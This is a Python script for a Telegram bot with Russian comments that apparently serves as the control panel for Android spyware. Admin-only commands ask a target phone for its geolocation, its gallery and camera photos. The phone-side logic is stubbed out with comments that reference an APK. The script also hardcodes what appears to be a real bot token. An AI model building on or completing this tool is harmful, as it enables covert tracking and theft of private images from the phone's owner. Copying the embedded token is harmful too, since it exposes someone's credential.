import os
import telebot
from flask import Flask, request

# ===== НАСТРОЙКИ =====
BOT_TOKEN = "8662374904:AAEMd1FOnIyAmmqW_Gh0k5_Sgam-QUBk_bs"
ADMIN_ID = 8699816052
# URL, который Render выдаст после деплоя (заменишь потом)
WEBHOOK_URL = "https://ghost-bot-97za.onrender.com"
# =====================

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ===== КОМАНДЫ =====

@bot.message_handler(commands=['start'])
def start(message):
    if message.chat.id != ADMIN_ID:
        return
    bot.send_message(message.chat.id,
        "🔐 Бот управления активирован.\n"
        "Команды:\n"
        "/geo — получить геолокацию\n"
        "/gallery — галерея\n"
        "/camera — фото с камеры\n"
        "/status — статус"
    )

@bot.message_handler(commands=['geo'])
def geo(message):
    if message.chat.id != ADMIN_ID:
        return
    bot.send_message(message.chat.id, "📍 Запрос геолокации отправлен на телефон...")
    # Здесь логика отправки команды на APK

@bot.message_handler(commands=['gallery'])
def gallery(message):
    if message.chat.id != ADMIN_ID:
        return
    bot.send_message(message.chat.id, "📸 Запрос галереи отправлен...")
    # Здесь логика

@bot.message_handler(commands=['camera'])
def camera(message):
    if message.chat.id != ADMIN_ID:
        return
    bot.send_message(message.chat.id, "📷 Запрос камеры отправлен...")
    # Здесь логика

@bot.message_handler(commands=['status'])
def status(message):
    if message.chat.id != ADMIN_ID:
        return
    bot.send_message(message.chat.id, "✅ Бот работает.")

# ===== WEBHOOK =====

@app.route('/' + BOT_TOKEN, methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return '', 200
    return '', 403

@app.route('/')
def index():
    return 'Bot is running'

# ===== ЗАПУСК =====

if __name__ == '__main__':
    bot.remove_webhook()
    bot.set_webhook(url=WEBHOOK_URL + '/' + BOT_TOKEN)
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
